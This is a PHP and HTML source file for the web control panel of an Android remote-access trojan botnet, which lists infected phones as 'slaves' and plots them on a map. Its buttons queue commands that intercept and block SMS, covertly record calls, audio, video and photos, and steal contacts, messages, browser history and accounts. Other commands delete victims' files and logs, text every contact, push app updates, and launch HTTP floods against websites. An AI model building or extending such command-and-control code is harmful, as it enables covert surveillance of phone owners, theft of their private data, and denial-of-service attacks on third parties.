<?php
  if (file_exists("reg.php")) {
    include("reg.php");
	if ($validDomain == "false") {
	  die("Unauthorized Domain: Please contact support.");
	}
  } else {
    die("Missing Files: Please contact support.");
  }

  if (file_exists("config.php")) {
    include("config.php");
  } else {
    header('Location: setup/');
  }
  
  session_start();
  if (empty($_SESSION['code'])) {
    header( 'Location: index.php' ) ;
    die();
  }
  
  include("functions.php");
  
  $getslaves = 'SELECT * FROM bots ORDER BY id';
  
?>
<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
    <title>Control</title>

    <link href="assets/css/bootstrap.css" rel="stylesheet" media="screen">
	<link href="assets/css/bootstrap-glyphicons.css" rel="stylesheet" media="screen">
	
	<script src="http://code.jquery.com/jquery.js"></script>
	<script src="assets/js/jquery.tablesorter.min.js"></script>
	<script src="assets/js/jquery.tablesorter.widgets.min.js"></script>
	<script src="assets/js/date.js"></script>
	
    <style type="text/css">
	  body {
	    background-image:url('assets/img/login_bg.png');
	  }
	  .main {
        width: 98%;
        height: 98%;
		
		background-color: #ffffff;
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
        outline: none;
        -webkit-box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);
        box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);

        position: absolute;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;

        margin: auto;
		
		padding: 15px 15px 15px 15px;
      }
	  .logo {
		margin: 0 0 0 -140px;
		height: 532px;
		width: 200px;
		z-index:-1;
		position: absolute;
	  }
	  #func td {
	    padding: 2px 2px 2px 2px;
		text-align: center;
	  }
	  .map {
	    width: 100%;
		height: 82%;
		margin-bottom: 5px;
	  }
	  #files td {
	    padding: 2px 2px 2px 2px;
		text-align: center;
	  }
	  .row {
	    margin: 0 0 -5px 0;
	  }
	  .fullwidth {
	    width: 100%;
		min-width: 135px;
	  }
	  .halfwidth {
	    width: 48%;
	  }
	  .addselection {
	    min-width: 30px;
	  }
	  .devicestable {
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
		margin-bottom: 5px;
	  }
	  .functionslist {
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
		margin-bottom: 5px;
	  }
	  .messageboxcontainer {
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
		min-height: 185px;
		max-height: 39%;
		/* position: absolute; */
	  }
	  .filestable {
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
		min-height: 185px;
		max-height: 185px;
		padding-top: 5px;
	  }
	  .mapcontainer {
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
		min-height: 185px;
		max-height: 39%;
		padding: 5px 5px 5px 5px;
		/* position: absolute; */
	  }
      input {
        text-align: center;
      }
	</style>
    <script src="https://maps.googleapis.com/maps/api/js?v=3.exp&sensor=false"></script>
    <script>
var map;
function initialize() {
  var mapOptions = {
    zoom: 0,
    center: new google.maps.LatLng(0.0, 0.0),
	disableDefaultUI: true,
    panControl: false,
    zoomControl: true,
    scaleControl: false,
    mapTypeId: google.maps.MapTypeId.HYBRID
  };
  map = new google.maps.Map(document.getElementById('map-canvas'),
      mapOptions);
}

google.maps.event.addDomListener(window, 'load', initialize);

    </script>
	
	<script>
	var selected=new Array();
	
	var markersArray = [];
	
	function gmapsmarker(location1, location2, title) {
	  var marker = new google.maps.Marker({
        position: new google.maps.LatLng(location1, location2),
        map: map,
		animation: google.maps.Animation.DROP,
        title: title
      });
	  markersArray.push(marker);
	}
	
	function deleteOverlays() {
      if (markersArray) {
        for (i in markersArray) {
          markersArray[i].setMap(null);
        }
        markersArray.length = 0;
      }
    }
	
	function deleteMarker(deltitle) {
	  return markersArray.indexOf(deltitle);
	}
	
	function select(bot, lat, longi) {
	  if (document.getElementById(bot).innerHTML == '-') {
	    document.getElementById(bot).innerHTML = '+';
		for(var i in selected){
          if(selected[i]==bot){
            selected.splice(i,1);
            break;
          }
        }
	    document.getElementById("selectednumber").innerHTML = selected.length;
		if (selected.length==0) {
		  document.getElementById("selectednumber").setAttribute("data-original-title", "None Selected");
		  deleteOverlays();
		} else {
	      document.getElementById("selectednumber").setAttribute("data-original-title", selected.join(', '));
		}
	  } else {
	  if (selected.indexOf(bot) == -1) {
	    selected.push(bot);
	  }
	  document.getElementById(bot).innerHTML = '-';
	  document.getElementById("selectednumber").innerHTML = selected.length;
	  document.getElementById("selectednumber").setAttribute("data-original-title", selected.join(', '));
	  gmapsmarker(lat, longi, bot);
	  }
	}
	
	function clearselection() {
	  for (var i=0;i<selected.length;i++) {
	    document.getElementById(selected[i]).innerHTML = '+';
	  }
	  selected.length = 0;
	  document.getElementById("selectednumber").innerHTML = selected.length;
	  document.getElementById("selectednumber").setAttribute("data-original-title", "None Selected");
	  deleteOverlays();
	}
	
	function selectall() {
	  selected = $("div.addbuttons > button").map(function(){
        return this.id;
      }).get();
	  var index = selected.indexOf(" ");
	  selected.splice(index, 1);
	  var index2 = selected.indexOf("");
	  selected.splice(index2, 1);
	  for (var i=0;i<selected.length;i++) {
		document.getElementById(selected[i]).onclick();
	  }
	  document.getElementById("selectednumber").innerHTML = selected.length;
	  document.getElementById("selectednumber").setAttribute("data-original-title", selected.join(', '));
	}
	
	function getHistory(uid) {
	  if (uid=="") {
	    document.getElementById("historyof").innerHTML = "All Bots";
	  } else {
	    document.getElementById("historyof").innerHTML = uid;
	  }
	  var xmlhttp;
	  xmlhttp=new XMLHttpRequest();
	  xmlhttp.onreadystatechange=function() {
	    if (xmlhttp.readyState==4 && xmlhttp.status==200){
		  document.getElementById("messages").innerHTML=xmlhttp.responseText;
		}
	  }
	  xmlhttp.open("GET","getmessages.php?uid="+uid,true);
      xmlhttp.send();
	}
	
	function addCommand(command, arg1, arg2) {
	  var xmlhttp;
	  xmlhttp=new XMLHttpRequest();
	  xmlhttp.onreadystatechange=function() {
	    if (xmlhttp.readyState==4 && xmlhttp.status==200){
		  if (xmlhttp.responseText=="Success"){
		    alert("Command Added");
		  } else {
		    alert(xmlhttp.responseText);
		  }
		}
	  }
	  xmlhttp.open("GET","addcommand.php?uid="+selected+"&command="+command+"&arg1="+arg1+"&arg2="+arg2,true);
      xmlhttp.send();
	}
	
	var refresh;
	
	var scroll;
	
	<?php if($autoscrolltextbox){ echo "scroll='auto'"; } else { echo "scroll='manual'"; } ?>
	
	function updateScroll() {
	  if (scroll=='auto'){
	    scroll='manual';
		document.getElementById("autoscrollbutton").innerHTML="Auto Scroll: Off";
	  } else {
	    scroll='auto';
		document.getElementById("autoscrollbutton").innerHTML="Auto Scroll: On";
	  }
	}
	
	function autoScroll(){
	  if (scroll=='auto'){
        var elem = document.getElementById('messagebox');
        elem.scrollTop = elem.scrollHeight;
	  } else {
	  
	  }
	}
	
	function autorefresh(uid) {
	  refresh = setInterval(function() { getHistory(uid); autoScroll(); }, <?php echo $messageboxrefreshspeed; ?>);
	}
	
	function stoprefresh() {
	  window.clearInterval(window.refresh);
	}
	
	function viewCommands() {
	  stoprefresh();
	  var xmlhttp;
	  xmlhttp=new XMLHttpRequest();
	  xmlhttp.onreadystatechange=function() {
	    if (xmlhttp.readyState==4 && xmlhttp.status==200){
		  document.getElementById("messages").innerHTML=xmlhttp.responseText;
		}
	  }
	  xmlhttp.open("GET","getwaitingcommands.php",true);
      xmlhttp.send();
	}
	
	function fixSelected() {
			$.each(selected, function(index, value) {
				document.getElementById(value).innerHTML = '-';
            });
	}

    function refreshTable() {
        $('#tablefill').load('table.php', function(){
		  fixSelected();
		});
    }
	
	function refreshFileTable() {
        $('#filetablefill').load('filetable.php', function(){
		});
	}
	
	function refreshImages() {
	    $('#replaceimages').load('showpictures.php?uid='+uid, function(){
		  var sliderval=document.getElementById('defaultSlider').value;
		  $('.getimgimg').width(sliderval+'px');
		});
	}
	
	function getImages() {
	  uid = $("#modaluid").val();
	  startdate = $("#modalstarttime").val();
	  enddate = $("#modalendtime").val();
	  filesize = $("#modalfilesize").val();
	  
	  fixstartdate = Date.parse(startdate).getTime()/1000;
	  fixenddate = Date.parse(enddate).getTime()/1000;
	  
	  var xmlhttp;
	  xmlhttp=new XMLHttpRequest();
	  xmlhttp.onreadystatechange=function() {
	    if (xmlhttp.readyState==4 && xmlhttp.status==200){
		}
	  }
	  xmlhttp.open("GET","getimages.php?uid="+uid+"&start="+fixstartdate+"&end="+fixenddate+"&filesize="+filesize,true);
      xmlhttp.send();
	  refreshImages();
	  imgrefresh = setInterval(refreshImages, 2000);
	}

	function deletePics(uid) {
	  var xmlhttp;
	  xmlhttp=new XMLHttpRequest();
	  xmlhttp.onreadystatechange=function() {
	    if (xmlhttp.readyState==4 && xmlhttp.status==200){
		  alert(xmlhttp.responseText);
		}
	  }
	  xmlhttp.open("GET","deletepics.php?uid="+uid,true);
      xmlhttp.send();
	}
	
$(function(){

    $('#defaultSlider').change(function(){
        $('.getimgimg').width(this.value);
    });

    $('#defaultSlider').change();

});
	</script>
	
	<script type='text/javascript'>
     $(document).ready(function () {
         if ($("[rel=tooltip]").length) {
             $("[rel=tooltip]").tooltip();
         }
         refreshTable();
	     refreshFileTable();
	     getHistory("");
	     autorefresh("");
		 setInterval(refreshTable, <?php echo $devicestablerefreshspeed; ?>);
		 setInterval(refreshFileTable, <?php echo $filestablerefreshspeed; ?>);
     });
    </script>
  </head>
  <body style="width: 100%; height: 100%;">
    <div class="main">
	  <div class="row" style="height:60%;">
	    <div class="col-lg-9 devicestable" style="height:100%; min-height:380px; padding-top: 5px; overflow:auto;">
		   <div id="tablefill"></div>
		</div>
  <div class="modal fade" id="imageModal">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
          <h4 class="modal-title">View Images</h4>
        </div>
        <div class="modal-body">
		  <p>UID</p>
		  <input class="form-control input-small" id="modaluid" type="text" value="">
		  <p>Start Date</p>
          <input class="form-control input-small" id="modalstarttime" type="date" placeholder="Start Date">
		  <p>End Date</p>
		  <input class="form-control input-small" id="modalendtime" type="date" placeholder="End Date">
		  <p>Max File Size</p>
		  <input class="form-control input-small" id="modalfilesize" type="text" placeholder="Max File Size in MB">
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
          <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#displayImages" data-dismiss="modal" onclick="getImages();">View Images</button>
        </div>
      </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
  </div><!-- /.modal -->
  
  <div class="modal fade" id="displayImages">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
          <h4 style="display:inline;" class="modal-title">Images</h4>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input id="defaultSlider" type="range" min="100" max="520" />
        </div>
        <div class="modal-body">
		  <div id="replaceimages"></div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" onclick="window.clearInterval(window.imgrefresh);" data-dismiss="modal">Close</button>
        </div>
      </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
  </div><!-- /.modal -->
	    <div class="col-lg-3 functionslist" style="height:100%; min-height:380px; padding-top: 5px; overflow:auto;">
		  <h4 style="display: inline-block;">Selected: <a data-toggle="tooltip" rel="tooltip" title="None Selected" data-placement="bottom" id="selectednumber">0</a></h4>&nbsp;&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="clearselection()">Deselect All</button>&nbsp;&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="selectall()">Select All</button>
		  <table class="table" id="func">
		    <tr>
			  <td><button type="button" onclick="addCommand('ringervolumeup')" class="btn btn-default btn-small fullwidth">Ringer Up</button></td>
			  <td><button type="button" onclick="addCommand('ringervolumedown')" class="btn btn-default btn-small fullwidth">Ringer Down</button></td>
			</tr>
		    <tr>
			  <td><button type="button" onclick="addCommand('mediavolumeup')" class="btn btn-default btn-small fullwidth">Media Up</button></td>
			  <td><button type="button" onclick="addCommand('mediavolumedown')" class="btn btn-default btn-small fullwidth">Media Down</button></td>
			</tr>
		    <tr>
			  <td colspan="2"><button type="button" onclick="addCommand('screenon')" class="btn btn-default btn-small fullwidth">Screen On</button></td>
			</tr>
		    <tr>
			  <td><button type="button" onclick="addCommand('intercept', true)" class="btn btn-default btn-small fullwidth">Intercept On</button></td>
			  <td><button type="button" onclick="addCommand('intercept', false)" class="btn btn-default btn-small fullwidth">Intercept Off</button></td>
			</tr>
		    <tr>
			  <td><button type="button" onclick="addCommand('blocksms', true)" class="btn btn-default btn-small fullwidth">Block SMS On</button></td>
			  <td><button type="button" onclick="addCommand('blocksms', false)" class="btn btn-default btn-small fullwidth">Block SMS Off</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="audiorecordtime" type="text" placeholder="Time in MS"></td>
			  <td><button type="button" onclick="addCommand('recordaudio', document.getElementById('audiorecordtime').value)" class="btn btn-default btn-small fullwidth">Record Audio</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="videorecordtime" type="text" placeholder="Time in MS"></td>
			  <td><div class="btn-group"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Record Video <span class="caret"></span></button><ul class="dropdown-menu" style="left: -17%;"><li><a href="#" onclick="addCommand('takevideo', 1, document.getElementById('videorecordtime').value)">Front Camera</a></li><li><a href="#" onclick="addCommand('takevideo', 0, document.getElementById('videorecordtime').value)">Back Camera</a></li></ul></div></td>
			</tr>
		    <tr>
			  <td><button type="button" onclick="alert('Please select Front or Back Camera.')" class="btn btn-default btn-small fullwidth">Take Photo</button></td>
			  <td><button type="button" onclick="addCommand('takephoto', 1)" class="btn btn-default btn-small halfwidth">Front</button>&nbsp;<button type="button" onclick="addCommand('takephoto', 0)" class="btn btn-default btn-small halfwidth">Back</button></td>
			</tr>
		    <tr>
			  <td><button type="button" onclick="addCommand('recordcalls', true)" class="btn btn-default btn-small fullwidth">Record Calls On</button></td>
			  <td><button type="button" onclick="addCommand('recordcalls', false)" class="btn btn-default btn-small fullwidth">Record Calls Off</button></td>
			</tr>
		    <tr>
			  <td colspan="2"><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Upload Files <span class="caret"></span></button><ul class="dropdown-menu" style="left: 0;"><li><a href="#" onclick="addCommand('uploadfiles')">All</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Calls')">Calls</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Audio')">Audio</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Pictures')">Pictures</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Videos')">Videos</a></li></div></td>
			</tr>
		    <tr>
			  <td colspan="2"><button type="button" onclick="addCommand('changedirectory')" class="btn btn-default btn-small fullwidth">Change Directory</button></td>
			</tr>
		    <tr>
			  <td colspan="2"><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Delete Files <span class="caret"></span></button><ul class="dropdown-menu" style="left: 0;"><li><a href="#" onclick="addCommand('deletefiles')">All</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Calls')">Calls</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Audio')">Audio</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Pictures')">Pictures</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Videos')">Videos</a></li></div></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="getamount" type="text" placeholder="Amount"></td>
			  <td><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Get <span class="caret"></span></button><ul class="dropdown-menu" style="left: -50%;"><li><a href="#" onclick="addCommand('getinboxsms', document.getElementById('getamount').value)">Inbox SMS</a></li><li><a href="#" onclick="addCommand('getsentsms', document.getElementById('getamount').value)">Outbox SMS</a></li><li><a href="#" onclick="addCommand('getbrowserhistory', document.getElementById('getamount').value)">Browser History</a></li><li><a href="#" onclick="addCommand('getbrowserbookmarks', document.getElementById('getamount').value)">Browswer Bookmarks</a></li><li><a href="#" onclick="addCommand('getcallhistory', document.getElementById('getamount').value)">Call History</a></li><li><a href="#" onclick="addCommand('getcontacts', document.getElementById('getamount').value)">Contacts</a></li><li><a href="#" onclick="addCommand('getuseraccounts', document.getElementById('getamount').value)">User Accounts</a></li><li><a href="#" onclick="addCommand('getinstalledapps', document.getElementById('getamount').value)">Installed Apps</a></li></div></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="smsnumber" type="text" placeholder="Number"><input class="form-control input-small" id="smsmessage" type="text" placeholder="Message"></td>
			  <td><button type="button" onclick="addCommand('sendtext', document.getElementById('smsnumber').value, document.getElementById('smsmessage').value)" class="btn btn-default btn-small fullwidth">Send SMS</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="deletesmsthreadid" type="text" placeholder="Thread ID"><input class="form-control input-small" id="deletesmsid" type="text" placeholder="ID"></td>
			  <td><button type="button" onclick="addCommand('deletesms', document.getElementById('deletesmsthreadid').value, document.getElementById('deletesmsid').value)" class="btn btn-default btn-small fullwidth">Delete SMS</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="contactsmessage" type="text" placeholder="Message"></td>
			  <td><button type="button" onclick="addCommand('sendcontacts', document.getElementById('contactsmessage').value)" class="btn btn-default btn-small fullwidth">Send to Contacts</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="callnumber" type="text" placeholder="Number"></td>
			  <td><button type="button" onclick="addCommand('callnumber', document.getElementById('callnumber').value)" class="btn btn-default btn-small fullwidth">Call Number</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="calllognumber" type="text" placeholder="Number"></td>
			  <td><button type="button" onclick="addCommand('deletecalllognumber', document.getElementById('calllognumber').value)" class="btn btn-default btn-small fullwidth">Delete Call Log</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="webpagesite" type="text" placeholder="Site"></td>
			  <td><button type="button" onclick="addCommand('openwebpage', document.getElementById('webpagesite').value)" class="btn btn-default btn-small fullwidth">Open Page</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="dialogtitle" type="text" placeholder="Title"><input class="form-control input-small" id="dialogmessage" type="text" placeholder="Message"></td>
			  <td><button type="button" onclick="addCommand('opendialog', document.getElementById('dialogtitle').value, document.getElementById('dialogmessage').value)" class="btn btn-default btn-small fullwidth">Open Dialog</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="appname" type="text" placeholder="App"></td>
			  <td><button type="button" onclick="addCommand('openapp', document.getElementById('appname').value)" class="btn btn-default btn-small fullwidth">Open App</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="floodsite" type="text" placeholder="Site"><input class="form-control input-small" id="floodtime" type="text" placeholder="Time in MS"></td>
			  <td><button type="button" onclick="addCommand('httpflood', document.getElementById('floodsite').value, document.getElementById('floodtime').value)" class="btn btn-default btn-small fullwidth">HTTP Flood</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="updateapplink" type="text" placeholder="Direct Link"><input class="form-control input-small" id="updateappversion" type="text" placeholder="Version #"></td>
			  <td><button type="button" onclick="addCommand('updateapp', document.getElementById('updateapplink').value, document.getElementById('updateappversion').value)" class="btn btn-default btn-small fullwidth">Update App</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="promptupdateversion" type="text" placeholder="Version #"></td>
			  <td><button type="button" onclick="addCommand('promptupdate', document.getElementById('promptupdateversion').value)" class="btn btn-default btn-small fullwidth">Prompt Update</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="transferboturl" type="text" placeholder="URL"></td>
			  <td><button type="button" onclick="addCommand('transferbot', document.getElementById('transferboturl').value)" class="btn btn-default btn-small fullwidth">Transfer Bot</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="timeouttime" type="text" placeholder="Time in MS"></td>
			  <td><button type="button" onclick="addCommand('settimeout', document.getElementById('timeouttime').value)" class="btn btn-default btn-small fullwidth">Set Timeout</button></td>
			</tr>
		    <tr>
			  <td colspan="2"><button type="button" onclick="addCommand('promptuninstall')" class="btn btn-default btn-small fullwidth">Prompt Uninstall</button></td>
			</tr>
            <tr><td></td><td></td><td></td></tr>
		  </table>
		</div>
	  </div>
	  <div class="row" style="height:37%; ">
		    <div class="col-lg-5 messageboxcontainer" style="height:100%; min-height: 100%;">
			  <h4 style="display: inline-block;">History Of: <a id="historyof">All Bots</a></h4>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="stoprefresh(); getHistory(''); autorefresh('');">All Bots</button>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" id="autoscrollbutton" onclick="updateScroll();">Auto Scroll: <?php if($autoscrolltextbox){echo "On";} else {echo "Off";} ?></button>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="viewCommands();">View Awaiting Commands</button>
			  <div class="well well-small" id="messagebox" style="max-height: 75%; min-height: 75%; overflow: auto;">
			    <div id="messages" style="font-size: <?php echo $postboxtextsize . 'px;'; ?>"></div>
			  </div>
			</div>
			<div class="col-lg-4 filestable" style="height:100%; min-height: 100%; overflow: auto;">
			  <div id="filetablefill"></div>
			</div>
	    <div class="col-lg-3 mapcontainer" style="height:100%; min-height: 100%;">
		  <div class="map" id="map-canvas"></div>
		  <button type="button" onClick="window.location='settings.php'" style="width: 48%" class="btn btn-default btn-small">Panel Settings</button>&nbsp;&nbsp;&nbsp;<button type="button" onClick="window.location='logout.php'" style="width: 48%" class="btn btn-default btn-small">Logout</button>
		</div>
	  </div>
	</div>
	
	<script src="assets/js/bootstrap.min.js"></script>
	<script>
	$(document).ready(function() 
        { 
			$("#files").tablesorter();
        } 
    );
    </script>

  </body>
</html>
<?php
  $connect = null;
?>